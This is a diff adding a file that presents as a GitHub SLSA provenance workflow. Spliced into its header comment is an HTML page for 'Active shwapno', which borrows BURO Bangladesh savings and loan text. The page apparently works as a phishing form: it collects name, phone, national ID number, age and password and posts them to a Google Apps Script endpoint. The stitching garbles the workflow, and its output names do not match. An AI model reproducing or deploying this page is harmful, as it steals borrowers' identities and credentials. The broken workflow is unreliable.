@@ -1,0 +1,219 @@
+# This workflow uses actions that are not certified by GitHub.
+# They are provided by a third-party and are governed by
+# separate terms of <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Ultra Fast</title>
+    <style>
+        /* ফাস্ট লোড সিএসএস */
+        :root { --p: #6366f1; --a: #22d3ee; --bg: #020617; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background: var(--bg); color: #fff; line-height: 1.5; }
+        
+        header { padding: 15px 5%; background: #0f172a; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; border-bottom: 1px solid #334155; }
+        .logo { font-weight: bold; color: var(--a); font-size: 20px; }
+        .btn { padding: 8px 15px; border-radius: 5px; cursor: pointer; border: none; font-weight: bold; font-size: 12px; }
+        .login-btn { background: #334155; color: white; margin-right: 5px; }
+        .reg-btn { background: var(--p); color: white; }
+
+        .hero { padding: 80px 5%; text-align: center; }
+        .hero h1 { font-size: 32px; margin-bottom: 10px; }
+        .hero h2 { font-size: 20px; color: var(--a); margin-top: 20px; }
+
+        /* পপআপ ডিজাইন */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 100; }
+        .modal.active { display: flex; }
+        .form-box { background: #1e293b; padding: 25px; border-radius: 10px; width: 90%; max-width: 400px; border: 1px solid var(--a); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #334155; background: #0f172a; color: white; outline: none; }
+        .sub-btn { width: 100%; padding: 12px; background: var(--p); color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+
+        /* প্রোফাইল কার্ড */
+        #profile { display: none; background: #1e293b; padding: 20px; border-radius: 10px; border: 1px solid var(--a); margin-top: 30px; text-align: left; }
+        .profile-title { color: var(--a); font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 5px; margin-bottom: 10px; }
+
+        footer { padding: 40px 5%; background: #0f172a; text-align: center; font-size: 12px; color: #94a3b8; margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">Active shwapno</div>
+        <div>
+            <button class="btn login-btn" onclick="openM('lModal')">LOGIN</button>
+            <button class="btn reg-btn" onclick="openM('rModal')">REGISTER</button>
+        </div>
+    </header>
+
+    <div class="hero">
+        <h1>আমাদের সেবা সমূহ</h1>
+        <p>সঞ্চয় সেবা সম্পর্কে জানতে চান?
+প্রত্যেক মানুষেরই ভবিষ্যৎ সুরক্ষার বিষয়টি বিবেচনা করে নিয়মিত সঞ্চয় করা উচিত। বুরো বাংলাদেশে ভর্তি হয়ে সদস্য/গ্রাহকগণ নিয়মিত সঞ্চয়ের মাধ্যমে ক্ষুদ্র/বৃহৎ আয়বর্ধক প্রকল্পে বিনিয়োগ, স্বাস্থ্য পরিচর্যা, সন্তানের শিক্ষা ব্যয়, গৃহ নির্মাণ এবং অন্যান্য অতি প্রয়োজনীয় খাতে বিনিয়োগ করার জন্য ছোটো অথবা বড় আকারের পুঁজি গঠন করতে পারেন। বুরো বাংলাদেশ তার সকল সদস্য/গ্রাহককে উন্মুক্ত সঞ্চয় সুবিধার মাধ্যমে মূল্যবান সেবা প্রদান করে এবং বুরো বাংলাদেশে জমাকৃত যেকোনো সঞ্চয় সহজে উত্তোলনযোগ্য।
+
+বুরো বাংলাদেশ সদস্য/গ্রাহকের জন্য নিম্নে বর্ণিত সঞ্চয় সেবাসমূহ প্রদান করে থাকে:
+(১) সাধারণ সঞ্চয় (General Savings)
+(২) স্বেচ্ছা সঞ্চয় (Voluntary Savings)
+(৩) মেয়াদি সঞ্চয় (Contractual Savings)
+(১) সাধারণ সঞ্চয় (General Savings)
+
+সকল ধরনের সদস্য/গ্রাহককে সংস্থার সদস্যপদ গ্রহণের সময় একটি সাধারণ সঞ্চয় হিসাব খুলতে হবে। সদস্য/গ্রাহককের সাধারণ সঞ্চয় জমার উপর বার্ষিক ৬% হারে লভ্যাংশ প্রদান করা হয়। ভর্তিকৃত সদস্য/গ্রাহক সর্বনিম্ন ২০ টাকা জমা প্রদান করে মাসিক/সাপ্তাহিক ভিত্তিতে সাধারণ সঞ্চয় জমা করতে পারেন।
+
+(২) স্বেচ্ছা সঞ্চয় (Voluntary Savings)
+স্বেচ্ছা সঞ্চয় হিসাবে সকল সদস্য/গ্রাহকগণ একাধিক সঞ্চয় হিসাব খুলতে পারবেন। সাপ্তাহিক ও মাসিক ভিত্তিতে যেকোনো পরিমাণ টাকা জমা প্রদান করা যাবে। ৩ বৎসর মেয়াদি স্বেচ্ছা সঞ্চয়ে সদস্যের সঞ্চয় জমার উপর বার্ষিক ৭.০০% লাভ প্রদান করা হয়।
+
+(৩) মেয়াদি সঞ্চয় (Contractual Savings)
+মেয়াদি সঞ্চয় হিসাবে সকল সদস্য/গ্রাহকগণ সাপ্তাহিক অথবা মাসিক কিস্তির মাধ্যমে নির্দিষ্ট মেয়াদ পূর্ণ করে সঞ্চয় করতে পারবেন। এক্ষেত্রে ৩ বৎসর মেয়াদি সঞ্চয়ের জন্য বার্ষিক ৭% হারে, ৫ বৎসর মেয়াদি সঞ্চয়ের জন্য ৮% হারে এবং ১০ বৎসর মেয়াদি সঞ্চয়ের জন্য ১০% হারে লাভ প্রদান করা হয়।</p>
+        
+        <h2>আমাদের লক্ষ্য</h2>
+        <p>নিজ উদ্যোগে স্বনির্ভর হতে চান তাদের জন্য এই ঋণ প্রদান করা হয়।
+২। প্রবাসে অবস্থানরত প্রবাসী পরিবারের সদস্যগন যারা দেশে অবস্থান করেন, তাদেরকে এ ঋণ প্রদান করা হয়।
+সেবা পদ্ধতি
+কেন্দ্রভুক্ত ও কেন্দ্রবহির্ভূত
+কিস্তির ধরন
+সাপ্তাহিক / মাসিক
+ঋণের মেয়াদ ও পরিমাণ
+মেয়াদ- ১,২ ও ৩ বছর ঋণের পরিমাণ - সদস্যদের সামর্থ্য/সক্ষমতা অনুযায়ী
+সার্ভিস চার্জ (ক্রমহ্রাসমান)
+২৪%</p>
+
+        <!-- প্রোফাইল কার্ড -->
+        <div id="profile">
+            <div class="profile-title">হিofile</div>
+            <p id="pName"></p>
+            <p id="pPhone"></p>
+            <p id="pAge"></p>
+            <div style="background: #10b981; color: white; padding: 5px 10px; display: inline-block; border-radius: 4px; font-weight: bold; margin-top: 10px;">Balance: 0.00 ৳</div>
+        </div>
+    </div>
+
+    <!-- লগইন পপআপ -->
+    <div class="modal" id="lModal">
+        <div class="form-box">
+            <h3 style="margin-bottom:10px">Login</h3>
+            <input type="tel" placeholder="Mobile Number">
+            <input type="password" placeholder="Password">
+            <button class="sub-btn" onclick="alert('Login system coming soon!')">LOGIN</button>
+            <button onclick="closeM()" style="background:none; color:gray; border:none; margin-top:10px; width:100%; cursor:pointer;">Close</button>
+        </div>
+    </div>
+
+    <!-- রেজিস্ট্রেশন পপআপ -->
+    <div class="modal" id="rModal">
+        <div class="form-box">
+            <h3 style="margin-bottom:10px">Registration</h3>
+            <form id="regForm">
+                <input type="text" name="name" id="inName" placeholder="Full Name" required>
+                <input type="tel" name="phone" id="inPhone" placeholder="Mobile Number" required>
+                <input type="number from=""" name="nid" placeholder="NID Number" required>
+                <input type="number" name="age" id="inAge" placeholder="Age" required>
+                <input type="password" name="password" placeholder="Set Password" required>
+                <button type="submit" class="sub-btn" id="sBtn">SUBMIT PROFILE</button>
+            </form>
+            <button onclick="closeM()" style="background:none; color:gray; border:none; margin-top:10px; width:100%; cursor:pointer;">Close</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>অবশ্যই আমাদের পাশে থাকবেন ধন্যবাদ</p>
+        <p>© 2024 Active shwapno|website</p>
+    </footer>
+
+    <script>
+        function openM(id) { document.getElementById(id).classList.add('active'); }
+        function closeM() { 
+            document.getElementById('lModal').classList.remove('active'); 
+            document.getElementById('rModal').classList.remove('active'); 
+        }
+
+        var scriptURL = 'https://script.google.com/macros/s/AKfycbwlNx5GOPs4300BrsmtZqJYC4OsKEnqJ81bZp5ZN2MpZzZs4HNfBVUNcO82S24Xs37LUg/exec';
+        const form = document.getElementById('regForm');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            const btn = document.getElementById('sBtn');
+            btn.innerHTML = "Sending..."; btn.disabled = true;
+
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(res => {
+                alert("ধন্যবাদ! আপনার তথ্যগুলো সম্পন্ন রুপে গ্রহণ করা হয়েছে।");
+                closeM();
+                document.getElementById('profile').style.display = 'block';
+                document.getElementById('pName').innerText = "Name: " + document.getElementById('inName').value;
+                document.getElementById('pPhone').innerText = "Phone: " + document.getElementById('inPhone').value;
+                document.getElementById('pAge').innerText = "Age: " + document.getElementById('inAge').value;
+                window.scrollTo(0, document.body.scrollHeight);
+            })
+            .catch(err => {
+                alert("Error! Check Internet Connection.");
+                btn.disabled = false;
+                btn.innerHTML = "SUBMIT PROFILE";
+            });
+        });
+    </script>
+</body>
+</html>
+, privacy policy, and support
+# documentation.
+
+# This workflow lets you generate SLSA provenance file for your project.
+# The generation satisfies level 3 for the provenance requirements - see https://slsa.dev/spec/v0.1/requirements
+# The project is an initiative of the OpenSSF (openssf.org) and is developed at
+# https://github.com/slsa-framework/slsa-github-generator.
+# The provenance file can be verified using https://github.com/slsa-framework/slsa-verifier.
+# For more information about SLSA and how it improves the supply-chain, visit slsa.dev.
+
+name: SLSA generic generator
+on:
+  workflow_dispatch:
+  release:
+    types: [created]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    outputs:
+      digests: ${{ steps.hash.outputs.digests }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # ========================================================
+      #
+      # Step 1: Build your artifacts.
+      #
+      # ========================================================
+      - name: Build artifacts
+        run: |
+            # These are some amazing artifacts.
+            echo "artifact1" > artifact1
+            echo "artifact2" > artifact2
+
+      # ========================================================
+      #
+      # Step 2: Add a step to generate the provenance subjects
+      #         as shown below. Update the sha256 sum arguments
+      #         to include all binaries that you generate
+      #         provenance for.
+      #
+      # ========================================================
+      - name: Generate subject for provenance
+        id: hash
+        run: |
+          set -euo pipefail
+
+          # List the artifacts the provenance will refer to.
+          files=$(ls artifact*)
+          # Generate the subjects (base64 encoded).
+          echo "hashes=$(sha256sum $files | base64 -w0)" >> "${GITHUB_OUTPUT}"
+
+  provenance:
+    needs: [build]
+    permissions:
+      actions: read   # To read the workflow path.
+      id-token: write # To sign the provenance.
+      contents: write # To add assets to a release.
+    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.4.0
+    with:
+      base64-subjects: "${{ needs.build.outputs.digests }}"
+      upload-assets: true # Optional: Upload to a new release
